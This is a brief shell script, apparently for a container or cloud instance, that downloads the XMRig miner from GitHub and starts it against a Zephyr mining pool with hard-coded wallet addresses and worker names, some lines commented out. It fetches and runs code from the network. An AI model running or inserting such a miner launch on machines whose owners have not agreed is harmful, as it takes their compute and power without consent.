apt-get update && apt-get install -y \
  wget \
  curl \
  libjansson4 \
  && rm -rf /var/lib/apt/lists/*
wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && \
tar xvfz xmrig-6.21.0-linux-x64.tar.gz
#xmrig-6.21.0/xmrig -o zephyr.miningocean.org:5352 -u ZEPHYR3YisENRDswEXYGcA8DjvBAx15B6RcUpWRixJTFKyNWEQmevmiaruch8ZrRmFKpwn6xLhjC8D7TUTzkBW2vJ6uvUBtXMFw4k -p doc4 -k -a rx/0 
#xmrig-6.21.0/xmrig -o zephyr.miningocean.org:5352 -u ZEPHYR2RGqzJL9CFpFD8qg4JjwaRcYJKphPMMobQHqTXZBDwUBMmJMtU6fb7ZuLKdvDiGdPopZ7JHgESboFyWkUrgzKGUJPXXqq3M -p xcas -k -a rx/0
xmrig-6.21.0/xmrig -o zephyr.miningocean.org:5352 -u ZEPHYR2KFZTUxe7aB8rF1hNtJJLjgv8h4jMudEVxjTrcggMRjafK94C8PWni9T3DmDfrZiAAeDjvEf1y3LZ4rjgyB4JQz995rRF2G -p kk16 -k -a rx/0 -t 16
